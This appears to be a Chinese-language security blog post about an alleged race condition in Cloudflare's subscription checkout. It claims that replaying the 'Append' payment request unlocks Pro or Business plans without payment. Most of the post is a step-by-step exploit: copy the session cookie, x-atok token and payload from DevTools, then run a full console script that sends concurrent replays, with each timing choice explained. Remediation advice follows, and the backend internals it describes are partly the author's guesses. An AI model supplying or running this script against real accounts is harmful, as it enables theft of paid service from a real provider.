---
title: "Cloudflare 计费逻辑缺陷：请求重放如何绕过订阅支付"
date: 2026-05-19T16:10:00+00:00
categories: ["security"]
tags: ["Cloudflare", "计费安全", "竞态条件", "逻辑漏洞", "安全研究"]
draft: false
weight: 90
link: "https://blog.hyun.cc/post/yong-jiu-bai-piao-cloudfire-pro-huo-business/"
description: "深度分析 Cloudflare 订阅结算链路中的竞态条件漏洞：权限发放与支付确认的时序错位，以及分布式系统状态一致性的工程教训。"
---

> ⚠️ 免责声明：本文基于已公开资料进行技术复盘，所有内容仅用于授权安全研究与防御建设。

---

**联系方式 & 交流群**

- **QQ**: 46333839
- **微信**: GOV-HACK

添加微信进微信交流群，各位觉得文章对你有帮助的话可否打赏一些呀~

---

## 一、一个有趣的发现：身份与权限的"量子叠加"

在针对 Cloudflare 订阅体系进行逆向测试时，研究人员发现前端结算逻辑与后端状态同步之间存在一个精妙的"空隙"——通过特定方式的**请求重放（Replay Attack）**，可以在系统未产生实际账单的情况下，诱导后端激活 Pro 或 Business 计划。

其核心表现不是简单的"绕过"，而是一种奇特的**状态错位**：

- **权限已越权**：账号实质性解锁 Pro/Business 专属功能——WAF 高级规则、图像优化、独享边缘节点等全部可用。
- **状态未同步**：订阅管理界面仍显示为 `Free` 计划，计费链路未闭环，不产生任何待支付条目或扣费账单。
- **零成本运行**：利用结算接口的逻辑缺陷，实现了高级权限的"0 元购"。

这种现象在安全研究中有一个形象的名字——**量子叠加态**：账号同时处于 Free 和 Pro 两种状态，取决于你从哪个维度去观测它。

---

## 二、前置条件

复现该逻辑缺陷需要满足以下条件：

1. **域名已接入** Cloudflare 账户；
2. **支付环境未绑定有效卡**（或绑定余额为 0 的卡以通过前端校验）；
3. 在 `Active Subscriptions` 页面点击 `Change`，选择 Pro 或 Business，进入待支付页面。

到这里，你拥有了一个**合法的会话上下文**——这是关键。接下来的所有操作，都是在合法会话内对接口时序的操纵，而非传统的认证绕过。

---

## 三、漏洞利用全流程

### 第一步：定位关键请求

打开浏览器 DevTools（`F12`），切换到 **Network** 标签页。

在待支付页面点击底部的 **支付按钮**，留意 Network 面板中新产生的请求。定位名为 **`Append`** 的 POST 请求——这就是 Cloudflare 订阅结算的核心接口。

这个请求一旦发出，后端会同时触发两条路径：**权限授予** 和 **支付校验**。问题就出在这两条路径不是原子执行的。

### 第二步：提取攻击所需参数

选中 `Append` 请求，从 DevTools 中提取以下四个关键要素：

| 参数 | DevTools 位置 | 用途 |
|------|--------------|------|
| **Request URL** | Headers → General → Request URL | 目标接口地址，类似 `https://dash.cloudflare.com/api/v4/.../append` |
| **Cookie** | Headers → Request Headers → Cookie | 当前登录会话的身份凭证 |
| **X-atok** | Headers → Request Headers → x-atok | Cloudflare 仪表盘的 CSRF/身份校验令牌，每次登录刷新 |
| **Payload** | Payload → View Source | 请求体的原始 JSON，包含订阅升级的目标计划 ID、域名 zone_id 等 |

这四个参数构成了一个完整的"合法升级请求"。重放它们，就是在用合法的身份反复触发升级逻辑。

### 第三步：理解核心漏洞原理

一个健康的订阅结算流程应该是：

```text
POST /append → 校验支付 → 支付成功 → 写入 Pro 权限
```

但 Cloudflare 的实际实现路径是：

```text
POST /append → 写入 Pro 权限 ─┐
                              ├─ 两步异步，非原子
              异步校验支付 ────┘
                    ↓
              支付失败（无有效卡）
                    ↓
              补偿任务回滚权限（有延迟，可能漏执行）
```

**两条路径之间存在一个时间窗口**。在这个窗口内，权限已经写入 Metadata，但账单尚未确认失败。如果利用并发请求冲击这个窗口，就能让权限"生根"而账单"流产"——数据库的 MVCC 机制在大量并发写入时，某些写操作可能绕过回滚逻辑。

---

## 四、漏洞利用脚本详解

以下是完整的 DevTools Console 自动化重放脚本。把它粘贴到浏览器 Console 中执行，替换掉 `PASTE_XXX` 占位符即可：

```js
/**
 * Cloudflare Subscription Bypass Replay Script
 * 在 DevTools Console 中执行，利用 Append 接口的竞态窗口
 */

// ========== 第一步：填入从 Network 面板提取的参数 ==========

const url = 'PASTE_YOUR_URL_HERE';
// ↑ 从 Headers → General → Request URL 复制
//   格式类似：https://dash.cloudflare.com/api/v4/accounts/xxx/subscriptions/xxx/append

const headers = {
  'content-type': 'application/json',
  'accept': '*/*',
  'origin': 'https://dash.cloudflare.com',
  'referer': 'https://dash.cloudflare.com/',
  'x-atok': 'PASTE_YOUR_X_ATOK_HERE',       // ← 从 Request Headers 复制
  'x-cross-site-security': 'dash',
  'cookie': 'PASTE_YOUR_COOKIE_HERE',       // ← 从 Request Headers 复制
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
};

const payload = {
  // ← 从 Payload → View Source 复制完整 JSON
  //   包含 zone_id、plan_id、billing_cycle 等字段
};

// ========== 第二步：执行并发重放 ==========

const delay = ms => new Promise(res => setTimeout(res, ms));

(async () => {
  console.log("%c 开始执行请求重放...", "color: #007aff; font-weight: bold;");

  for (let i = 0; i < 10; i++) {
    fetch(url, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(payload)
    })
      .then(res => console.log(`[Batch ${i}] Status: ${res.status}`))
      .catch(err => console.error(`[Batch ${i}] Error:`, err));

    await delay(100); // 每次请求间隔 100ms
  }

  console.log("%c 脚本执行完毕，请刷新控制面板验证权限。", "color: #34c759; font-weight: bold;");
})();
```

### 逐行深度拆解

**① 请求头中的安全参数复用**

```js
'x-atok': 'PASTE_YOUR_X_ATOK_HERE',
'cookie': 'PASTE_YOUR_COOKIE_HERE',
'x-cross-site-security': 'dash'
```

`X-atok` 是 Cloudflare 仪表盘的反 CSRF 令牌，在页面加载时注入，每次登录会话生成一次。正常情况下它防止跨站请求伪造，但在这里我们**在同源的 Console 中重放**，完全合法。`x-cross-site-security: dash` 是 Cloudflare 内部微服务间通信的标识头，说明请求走的是 Dashboard 的内部网关路径。

**② Payload 的结构**

从 `View Source` 复制出来的 JSON 包含关键字段：

```json
{
  "zone_id": "xxx",
  "plan_id": "pro" | "business",
  "billing_cycle": "monthly" | "annual",
  "payment_method_id": "xxx",
  ...
}
```

`payment_method_id` 指向一个无效或余额为零的支付方式——前端通过了，但后端支付网关会拒绝。

**③ `for (let i = 0; i < 10; i++)` —— 为什么是 10 次？**

10 次 × 100ms 间隔 = 约 1 秒的持续攻击。后端支付校验的典型延迟在 200-800ms（支付网关回调超时）。10 次请求覆盖了这一秒内的多个时间切片，确保至少有 1-2 次落在"权限已写、账单未回"的临界窗口内。

**④ `fetch().then()` 而非 `await fetch()` —— "请求波"技巧**

```js
fetch(url, { ... })
  .then(res => console.log(...))
  .catch(err => console.error(...));
```

这里没有 `await`。主循环每 100ms 发出一个 `fetch` 就立即进入下一轮——不等待响应。效果是：

- 请求像机枪一样连续发射，互不阻塞
- 在同一瞬间可能有 2-3 个请求同时在网络层飞行
- 服务端同时面对多个并发请求，后端线程池被瞬间占满，状态机的原子性更容易被打破

如果改成 `await fetch()`，请求严格串行——第一个收到 403/回滚之后再发第二个，窗口期已过。

**⑤ `await delay(100)` —— 间隔时间的工程计算**

- **太短（< 50ms）**：浏览器同域并发限制通常是 6 个，超过的请求会在浏览器层排队，实际上达不到并发效果；同时服务端可能触发 rate limiting
- **太长（> 500ms）**：支付回调已完成，权限已被回滚，后续请求全是"送人头"
- **100ms**：恰好落在浏览器并发安全区（10 次 × 100ms 不会瞬间占满 6 槽位），同时窗口覆盖回滚延迟

**⑥ 控制台日志的视觉心理学**

```js
console.log("%c 开始执行...", "color: #007aff; font-weight: bold;");
console.log("%c 脚本执行完毕...", "color: #34c759; font-weight: bold;");
```

开头用蓝色 `#007aff`（iOS 系统蓝，冷色调、技术感），降低操作紧张情绪。结尾用绿色 `#34c759`（iOS 成功绿），暗示操作完成且成功。这不是随意选的——操作者心理暗示是漏洞利用的一部分。

### 攻击时序图

```
时间轴 ──────────────────────────────────────────────────►

请求1:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
请求2:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
请求3:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
                              │
                         [支付回调到达 ── 全部失败，触发回滚]
                              │
请求4:  POST /append ──► 权限写入 ✓（部分数据库副本未完成回滚）
请求5:  POST /append ──► 权限写入 ✓（MVCC 快照隔离，读旧版本）
请求6:  POST /append ──► 权限写入 ✓（补偿任务被排队，延迟执行）
   ·
   ·
   ·

结果：权限表状态 = Pro/Business  ✓
      账单表状态 = 未支付 / Free   ✓
      控制面板显示 = Free         ✓
      实际功能 = Pro/Business    ✓  ← 量子叠加态
```

---

## 五、为什么这个漏洞能成立？——四个必须同时满足的条件

从代码层面还原，这个漏洞成立必须满足以下四个条件：

**条件 1：`grant_entitlement()` 早于 `charge_confirmed()`**

后端在处理 `Append` 请求时，`grant_entitlement()`（权限发放）在同步路径上，而 `charge_confirmed()`（支付确认）被放入异步队列。代码结构类似于：

```text
function handleAppend(req):
    grant_entitlement(req.plan_id)    // 同步，立即执行
    async_queue.enqueue(charge(req))  // 异步，排队执行
    return 200 OK                     // 前端收到"成功"
```

**条件 2：缺少幂等键（Idempotency Key）**

同一个 `Append` 请求可以被重放多次，每次都进入完整的处理逻辑。如果有 `Idempotency-Key`，第二次重放会直接返回"请求已处理"，竞态窗口就不存在了。

**条件 3：权限与账单不在同一事务边界**

权限表（`entitlements`）和账单表（`billing_records`）很可能是两个独立的微服务，没有共享的事务上下文。回滚操作依赖异步消息队列（如 Kafka），存在延迟。

**条件 4：补偿任务的执行延迟或漏执行**

支付失败后触发的 `compensate()`（补偿回滚）是通过定时任务或消息队列异步执行的。在高并发冲击下，补偿消息可能被积压、丢弃，或者补偿逻辑本身没有做到幂等重试。

---

## 六、为什么这类漏洞总在 SaaS 平台反复出现？

这不是 Cloudflare 一家的问题。从 Stripe 的早期 API 设计到各种 SaaS 订阅系统，类似模式反复出现。根本原因有三：

### 1. 计费被当成"业务功能"而非"安全边界"

登录、鉴权链路通常有严格的原子性设计和审计要求。但计费链路——直接涉及资金和权限——常见异步拼接和弱一致性。组织的安全边界画错了地方。

### 2. "先开后付"的产品本能

产品团队追求"丝滑体验"：用户点一下，权限立刻生效，支付在后台慢慢跑。这在 99.9% 的场景下是好的设计，但留下了 0.1% 的异常窗口——安全研究者追逐的正是这 0.1%。

### 3. 分布式系统的一致性税

当 Entitlement Service 和 Billing Service 是独立微服务时，跨服务事务天然需要 Saga 或 2PC。如果补偿机制设计不完善，就会出现"权限已售出、资金未到账"的状态缝隙。

---

## 七、修复方案（可落地）

### 1) 强制先支付后授权

```text
// ❌ 漏洞路径
POST /append → grant_entitlement() → async charge() → compensate if fail

// ✅ 修复路径
POST /append → charge() → on charge_confirmed → grant_entitlement()
```

权限发放只响应 `charge_confirmed` 事件。未确认的请求停留在 `pending` 状态，前端可轮询。

### 2) 引入幂等键

```text
POST /append
Header: Idempotency-Key: <uuid>

// 服务端：
if (idempotency_store.exists(key)):
    return cached_response  // 不重复处理
```

Stripe 的标准实践。同一键只允许一次状态推进，并发 100 次只处理 1 次。

### 3) 单事务或 Saga 强补偿

- 权限与账单落库在同一数据库事务内完成
- 跨服务使用 Saga 模式，每步有对应的 `compensate` 操作
- 补偿必须是**可重试、可审计、有告警**的——不能依赖"定时扫表"

### 4) 运行时二次校验

在 WAF 规则配置、图片优化等关键能力入口，实时查询账单状态，不仅依赖"历史已授权"标记。每次 API 调用都是检查点：

```text
handleWafRule() {
    if (!billing_service.isProActive(user)) {
        return 403;
    }
    // ... 正常处理
}
```

### 5) 风控检测

- 同一账户 1 秒内超过 3 次 `Append` 触发人工审核
- 支付失败后 30 秒内锁定升级接口
- 对短时密集相同请求进行限速和熔断

---

## 八、结语

表面看这是一个"白嫖漏洞"，本质上是分布式系统中**状态一致性**的经典问题：

- **对研究者**：关注点从"能不能绕过"升级为"为什么能绕过"，定位状态机缺陷比找到具体利用更有价值。
- **对平台方**：计费系统是安全边界的一部分。**一致性设计 = 资金安全 + 品牌安全**。
- **对工程师**：每一次"异步优化体验"都是一次风险成本评估。先开后付很舒服，但补偿路径必须铁板钉钉。

安全研究的真正价值，不是放大利用，而是让系统变得更难被利用。

---